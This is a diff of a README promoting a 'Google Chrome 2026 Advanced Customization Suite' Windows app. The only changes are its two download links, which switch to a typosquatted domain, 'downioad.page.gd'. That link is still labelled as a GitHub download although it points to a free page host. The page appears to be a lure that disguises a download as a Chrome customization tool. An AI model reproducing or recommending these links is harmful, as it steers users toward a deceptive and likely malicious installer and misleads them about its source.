@@ -2,7 +2,7 @@
 
 In the ever-evolving landscape of web browsing, having control over your browser's functionality and appearance is paramount. The Google Chrome 2026 Advanced Customization Suite is a Windows desktop application designed to provide users with a powerful set of tools to personalize and optimize their Google Chrome experience. Whether you're a developer seeking advanced debugging options or a casual user wanting a sleek interface, this suite offers something for everyone.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -94,7 +94,7 @@ The Google Chrome 2026 Advanced Customization Suite empowers users to take contr
 
 For the latest version and updates, visit the download link below.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
